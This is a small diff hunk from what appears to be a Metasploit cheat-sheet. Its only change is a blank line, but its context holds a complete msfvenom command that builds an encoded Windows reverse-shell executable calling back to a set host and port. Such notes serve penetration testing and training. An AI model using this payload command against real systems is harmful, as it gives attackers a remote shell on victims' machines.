@@ -393,6 +393,7 @@ Metasploit
 ====================
            
 Windows Reverse tcp
+             
            msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
            
            Open Metasploit
